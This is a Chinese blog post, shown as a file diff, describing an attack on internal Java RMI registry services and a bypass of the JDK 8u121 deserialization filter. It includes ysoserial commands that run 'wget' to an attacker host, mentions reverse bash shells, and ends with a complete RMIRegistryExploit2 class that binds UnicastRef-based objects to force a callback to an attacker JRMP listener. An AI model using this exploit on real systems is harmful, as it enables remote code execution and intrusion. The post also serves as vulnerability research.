@@ -1,0 +1,335 @@
+---
+layout: post  
+title: "一次攻击内网rmi服务的深思"  
+date: 2018-09-20
+description: "java安全"
+tag: java安全
+---
+
+## 说明
+
+在日常扫描内网服务器的时候发现有几台主机开放了rmi服务，根据以往经验rmi服务存在反序列化漏洞，本以为可以直接拿ysoserial一把梭直接干。
+
+![](http://ohsqlm7gj.bkt.clouddn.com/18-9-20/41797551.jpg)
+
+java -cp ysoserial.exploit.RMIRegistryExploit 10.9.15.193 9999 CommonsCollections2 "wget http://xxxxx:3344"
+
+以往都成功过，但是这次居然爆出了filter status: REJECTED
+
+![](http://ohsqlm7gj.bkt.clouddn.com/18-9-20/78251456.jpg)
+
+出现这种情况的原因是[java 8 update 121]之后[RMIRegistryImpl.registryFilter()](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388) 的限制http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388
+
+可以看到在idk8 update 121之后在registryFilter函数中限制了类型。
+
+![](http://ohsqlm7gj.bkt.clouddn.com/18-9-20/10387266.jpg)
+
+本地写个rmi注册服务模拟下:
+
+```
+public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException {
+    //System.setProperty("sun.rmi.registry.registryFilter", "java.util.HashMap;");
+    //System.setProperty("sun.rmi.registry.registryFilter", "java.util.HashMap;sun.reflect.annotation.**;");
+    //System.setProperty("sun.rmi.registry.registryFilter", "java.**;sun.reflect.annotation.**;com.sun.**");
+    //System.setProperty("sun.rmi.registry.registryFilter", "org.apache.commons.collections4.comparators.TransformingComparator");
+    HelloService helloService = new HelloServiceImpl();
+    LocateRegistry.createRegistry(12306);
+    Naming.bind("rmi://localhost:12306/helloService", helloService);
+    System.out.println("ServerMain provide RPC service now");
+
+}
+```
+
+启动之后用java -cp ysoserial.exploit.RMIRegistryExploit 127.0.0.1 12306 CommonsCollections2 "wget http://xxxxx:3344"去攻击发现服务端爆出
+
+```
+ServerMain provide RPC service now
+九月 20, 2018 12:31:57 下午 java.io.ObjectInputStream filterCheck
+信息: ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 8, depth: 2, bytes: 298, ex: n/a
+```
+
+这里很明显为什么是AnnotationInvocationHandler这个了类被拦截了，因为在CommonsCollections2中其实是利用了动态代理加强之后，如果不了解这步更多详情可以移步[java反序列化漏洞-玄铁重剑之CommonsCollection(上)](http://www.codersec.net/2018/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%8E%84%E9%93%81%E9%87%8D%E5%89%91%E4%B9%8BCommonsCollection(%E4%B8%8A)/)
+
+根据限制所以我把目光放在Number(不考虑)，Remote，Proxy，UnicastRef，RMIClientSocketFactory，RMIServerSocketFactory，ActivationID，UID(基本不考虑)这几个类中。
+
+其中UnicastRef引起了我的注意，如果稍微有点印象的就可以知道UnicastRef本身Amf3反序列化的时候使用过。
+
+那么转换攻击思路就来了:
+
+![](http://ohsqlm7gj.bkt.clouddn.com/18-9-20/8759288.jpg)
+
+## 调试之路
+
+说是这么说，但是自己在调试和尝试的过程中踩了很多坑，还好没放弃。参考RMIRegistryExploit我们重点就是要构造好Remote对象，首先先构造好UnicastRef。直接采用[【技术分享】Java AMF3 反序列化漏洞分析](https://www.anquanke.com/post/id/85846)的类似写法
+
+```
+public static UnicastRef generateUnicastRef(String host, int port) {
+    java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
+    sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
+    sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
+    return new sun.rmi.server.UnicastRef(liveRef);
+}
+```
+
+然后稍做在RMIRegistryExploit的基础上稍微做一点改动，直接把
+
+```
+Object payload = payloadObj.getObject(command);//CommonsCollections2 
+String name = "pwned" + System.nanoTime();
+Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
+```
+
+改成
+
+```
+ Object payload = generateUnicastRef("127.0.0.1", "3348");
+String name = "pwned" + System.nanoTime();
+Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
+```
+
+答案是服务器依旧爆ObjectInputFilter REJECTED，这个很正常，因为经过Gadgets.createMemoitizedProxy的处理逻辑本身就是AnnotationInvocationHandler这个用来动态代理，在本地服务器调试的时候加上
+
+System.setProperty("sun.rmi.registry.registryFilter", "java.**;sun.reflect.annotation.**;com.sun.**");发现是可以执行命令的，说明我们的思路是对的，UnicastRef直接也可以反序列化的，那么接下来就是要想办法怎么去绕过ObjectInputFilter REJECTED这个限制了，本身UnicastRef是在registryFilter的范围之内的，但是在registry.bind(name, remote)的时候需要传入一个Remote对象。思路很清晰就是我们如果把UnicastRef封装成Remote类型,比如:
+
+1.动态反射
+
+2.找一个同时继承实现两者的类或者实现Remote，并将UnicastRef类型作为其一个字段
+
+自定义一个反射
+
+```
+public static class PocHandler implements InvocationHandler, Serializable {
+    private RemoteRef ref;
+
+    protected PocHandler(RemoteRef newref) {
+        ref = newref;
+    }
+
+
+    @Override
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        return method.invoke(this.ref, args);
+    }
+}
+```
+
+```
+UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
+Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class<?>[]{Remote.class}, new PocHandler(unicastRef));
+ registry.bind("2333", remote);
+```
+
+![](http://ohsqlm7gj.bkt.clouddn.com/18-9-20/30087933.jpg)
+
+开心，耐着性子接着去找第二种情况，这里真的找了好久好久，刚开始看到UnicastRemoteObject(Remote)，本来想通过设置ref字段去设置UnicastRef,但是一直爆没有该字段，父类的父类的父类(太爷爷类)RemoteObject中有ref字段。但是被申明为transient(不会被序列化，即使被反序列化之后还会为null)。
+
+只能看源码了，找了很久(真的很久)找到了一个RemoteObjectInvocationHandler，本身是InvocationHandler还不会有异常。
+
+```
+UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
+Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class<?>[]{Activator.class}, new PocHandler(unicastRef));
+ registry.bind("23333", remote);
+```
+
+
+
+还有一个RMIConnectionImpl_Stub类，情况2
+
+```
+UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
+RMIConnectionImpl_Stub remote = new RMIConnectionImpl_Stub(unicastRef);
+registry.bind(name, remote);
+```
+
+都可以还不报异常，开心。
+
+![](http://ohsqlm7gj.bkt.clouddn.com/18-9-20/22685923.jpg)
+
+## bingo
+
+本地调试好自己去开始可以去执行命令了，比如反弹bash,借用下[http://jackson.thuraisamy.me/runtime-exec-payloads.html](http://jackson.thuraisamy.me/runtime-exec-payloads.html)需要转成base64之后执行。最后贴下代码吧：
+
+```
+package ysoserial.exploit;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.server.UnicastServerRef;
+import ysoserial.payloads.CommonsCollections1;
+import ysoserial.payloads.ObjectPayload;
+import ysoserial.payloads.ObjectPayload.Utils;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.Reflections;
+import ysoserial.secmgr.ExecCheckingSecurityManager;
+import sun.rmi.registry.RegistryImpl;
+
+import javax.management.remote.rmi.RMIConnectionImpl_Stub;
+import javax.net.ssl.*;
+import java.io.IOException;
+import java.io.ObjectInput;
+import java.io.ObjectOutput;
+import java.io.Serializable;
+import java.lang.reflect.*;
+import java.net.Socket;
+import java.rmi.ConnectIOException;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.rmi.activation.Activator;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.*;
+import java.security.cert.X509Certificate;
+import java.util.concurrent.Callable;
+
+/**
+ * 使用UnicastRef注入，绕过ObjectInputFilter checkInput对几个基础类型的检测
+ * sun.rmi.registry.
+ */
+public class RMIRegistryExploit2 {
+    private static class TrustAllSSL extends X509ExtendedTrustManager {
+        private static final X509Certificate[] ANY_CA = {};
+
+        public X509Certificate[] getAcceptedIssuers() {
+            return ANY_CA;
+        }
+
+        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+        public void checkServerTrusted(final X509Certificate[] c, final String t, final SSLEngine e) { /* Do nothing/accept all */ }
+
+        public void checkServerTrusted(final X509Certificate[] c, final String t, final Socket e) { /* Do nothing/accept all */ }
+
+        public void checkClientTrusted(final X509Certificate[] c, final String t, final SSLEngine e) { /* Do nothing/accept all */ }
+
+        public void checkClientTrusted(final X509Certificate[] c, final String t, final Socket e) { /* Do nothing/accept all */ }
+    }
+
+    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
+        public Socket createSocket(String host, int port) throws IOException {
+            try {
+                SSLContext ctx = SSLContext.getInstance("TLS");
+                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);
+                SSLSocketFactory factory = ctx.getSocketFactory();
+                return factory.createSocket(host, port);
+            } catch (Exception e) {
+                throw new IOException(e);
+            }
+        }
+    }
+
+    public static void main(final String[] args) throws Exception {
+        System.out.println("用法如下 RMIRegistryHost  RMIRegistryPort JRMPListenerHost JRMPListenerPort");
+        final String rmiRegistryHost = args[0];
+        final int rmiRegistryPort = Integer.parseInt(args[1]);
+        final String jrmpListenerHost = args[2];
+        final int jrmpListenerPort = Integer.parseInt(args[3]);
+        Registry registry = LocateRegistry.getRegistry(rmiRegistryHost, rmiRegistryPort);
+
+        // test RMI registry connection and upgrade to SSL connection on fail
+        try {
+            registry.list();
+        } catch (ConnectIOException ex) {
+            registry = LocateRegistry.getRegistry(rmiRegistryHost, rmiRegistryPort, new RMISSLClientSocketFactory());
+        }
+
+        // ensure payload doesn't detonate during construction or deserialization
+        exploit(registry, jrmpListenerHost, jrmpListenerPort);
+    }
+
+    public static void exploit(final Registry registry,
+                               final Class<? extends ObjectPayload> payloadClass,
+                               final String command) throws Exception {
+        new ExecCheckingSecurityManager().callWrapped(new Callable<Void>() {
+            public Void call() throws Exception {
+                ObjectPayload payloadObj = payloadClass.newInstance();
+                Object payload = payloadObj.getObject(command);
+                String name = "pwned" + System.nanoTime();
+                Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
+                try {
+                    registry.bind(name, remote);
+                } catch (Throwable e) {
+                    e.printStackTrace();
+                }
+                Utils.releasePayload(payloadObj, payload);
+                return null;
+            }
+        });
+    }
+
+    public static void exploit(final Registry registry, final String jrmpListenerHost, final int jrmpListenerPort) throws Exception {
+
+        UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
+        /*
+        poc 1*/
+        RMIConnectionImpl_Stub remote = new RMIConnectionImpl_Stub(unicastRef);
+        /*
+        poc2
+        Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class<?>[]{Activator.class}, new PocHandler(unicastRef));
+         */
+        /*
+        poc3
+        Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class<?>[] { Activator.class }, new RemoteObjectInvocationHandler(unicastRef));
+         */
+        /*
+        poc4 失败，无效
+        UnicastRemoteObject remote = Reflections.createWithoutConstructor(java.rmi.server.UnicastRemoteObject.class);
+        Reflections.setFieldValue(unicastRemoteObject, "ref", unicastRef);
+        */
+        String name = "pwned" + System.nanoTime();
+        try {
+            registry.bind(name, remote);
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
+    /***
+     * 生成一个UnicastRef对象
+     * @param host
+     * @param port
+     * @return
+     */
+    public static UnicastRef generateUnicastRef(String host, int port) {
+        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
+        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
+        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
+        return new sun.rmi.server.UnicastRef(liveRef);
+    }
+
+    public static class PocHandler implements InvocationHandler, Serializable {
+        private RemoteRef ref;
+
+        protected PocHandler(RemoteRef newref) {
+            ref = newref;
+        }
+
+
+        @Override
+        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+            return method.invoke(this.ref, args);
+        }
+    }
+
+}
+
+```
+
+最后才发现在ysoserial.payloads.JRMPClient其实也有，原来早就有，害我调试这么久。
+
+![](http://ohsqlm7gj.bkt.clouddn.com/18-9-20/54229296.jpg)
+
+不过找到了RemoteObjectInvocationHandler和RMIConnectionImpl_Stub着两个，调试跟踪了那么久，好歹有些安慰。看先知才知道RemoteObjectInvocationHandler和RMIConnectionImpl_Stub已经被拿来利用了，感觉消息有些封闭。[https://xz.aliyun.com/t/2479](https://xz.aliyun.com/t/2479)
+
+## 参考
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388
+
+https://stackoverflow.com/questions/41821240/rmi-registry-filter-rejects-rmi-configuration-class-in-java-8-update-121
+
+https://www.anquanke.com/post/id/85846
+
+https://github.com/frohoff/ysoserial
+
+https://xz.aliyun.com/t/2479
